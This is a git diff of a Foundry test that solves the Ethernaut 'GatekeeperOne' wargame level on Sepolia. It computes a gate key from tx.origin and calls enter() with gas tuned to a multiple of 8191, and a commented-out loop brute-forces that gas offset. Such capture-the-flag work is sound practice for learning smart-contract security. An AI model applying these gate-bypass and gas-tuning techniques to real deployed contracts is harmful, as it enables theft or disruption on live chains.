@@ -7,35 +7,31 @@ import {GatekeeperOne} from "../src/GatekeeperOne.sol";
 contract GatekeeperOneTest is Test {
 
     function setUp() public {
-        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6655846);
+        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6665596);
     }
 
     function test_Enter() public {
-        // GatekeeperOne gatekeeperOne = GatekeeperOne(0x6c7EF5C8cab660fF20304Ef08C375E889eFa9219);
-        GatekeeperOne gatekeeperOne = new GatekeeperOne();
-        
-        Attacker attacker = new Attacker();
+        GatekeeperOne gatekeeperOne = GatekeeperOne(0x6c7EF5C8cab660fF20304Ef08C375E889eFa9219);
+        // GatekeeperOne gatekeeperOne = new GatekeeperOne();
         
         console.log((gatekeeperOne.entrant()));
 
-        bytes8 key = bytes8(uint64(uint16(uint160(address(this)))) + 2**32);
+        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | (uint64(1) << 32));
 
-        uint256 gasToUse = 8191 * 10 + 100; // 确保有充足的gas并是8191的倍数
+        // for(uint256 i = 0;i < 300; i++) {
+        //     uint256 gasToUse = 8191 * 3 + i;
 
-        attacker.attack(key, address(gatekeeperOne));
+        //     (bool success, ) = address(gatekeeperOne).call{gas: gasToUse}(abi.encodeWithSignature("enter(bytes8)", key));
+        //     if(success) {
+        //         console.log("gas : ", i);
+        //         break;
+        //     }
+        // }
+
+        uint256 gasToUse = 8191 * 3 + 256;
+        gatekeeperOne.enter{gas: gasToUse}(key);
 
         console.log(gatekeeperOne.entrant());
     }
 
-}
-
-contract Attacker {
-
-    function attack(bytes8 _gateKey, address gateAddress) public {
-        GatekeeperOne gatekeeperOne = GatekeeperOne(gateAddress);
-
-        uint256 gasToUse = 8191 * 3; 
-
-        gatekeeperOne.enter{gas: gasToUse}(_gateKey);
-    }
 }
